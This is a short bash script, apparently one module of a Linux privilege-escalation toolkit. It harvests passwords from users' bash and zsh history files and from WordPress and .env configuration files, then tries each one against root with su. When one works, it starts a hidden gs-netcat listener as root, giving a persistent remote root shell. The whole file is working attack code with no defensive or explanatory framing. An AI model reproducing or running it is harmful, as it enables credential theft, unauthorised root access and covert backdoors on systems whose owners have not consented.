#!/bin/bash
source "$(dirname "$0")/00_common.sh"
METHOD="passwords"
info "Hunting passwords..."
passwords=()
# History files
for h in /home/*/.bash_history /root/.bash_history /home/*/.zsh_history; do
    [ -r "$h" ] && passwords+=($(grep -hioP "(?:pass|pwd|password)[=:\"' ]+\K[^\s\"']+|(?:mysql|psql).*-p\K[^\s]+" "$h" 2>/dev/null|head -5))
done
# Config files
for c in /var/www/*/wp-config.php /var/www/*/.env /home/*/.env /opt/*/.env; do
    [ -r "$c" ] && passwords+=($(grep -hioP "(?:DB_PASSWORD|PASSWORD|SECRET)['\"]?\s*[=:]\s*['\"]?\K[^'\";\s]+" "$c" 2>/dev/null|head -3))
done
# Try passwords
for p in "${passwords[@]}"; do
    [ -z "$p" ] && continue
    echo "$p"|timeout 2 su - root -c "id" 2>/dev/null|grep -q "uid=0" && {
        secret=$(cat /dev/urandom|tr -dc 'a-z0-9'|head -c20)
        echo "$p"|su - root -c "nohup gs-netcat -s '$secret' -l -i &>/dev/null &" 2>/dev/null
        result_json "$METHOD" "success" "Password reuse" "$secret"; exit 0
    }
done
[ ${#passwords[@]} -gt 0 ] && { result_json "$METHOD" "partial" "Found ${#passwords[@]} passwords" ""; exit 0; }
result_json "$METHOD" "fail" "No passwords found"; exit 1
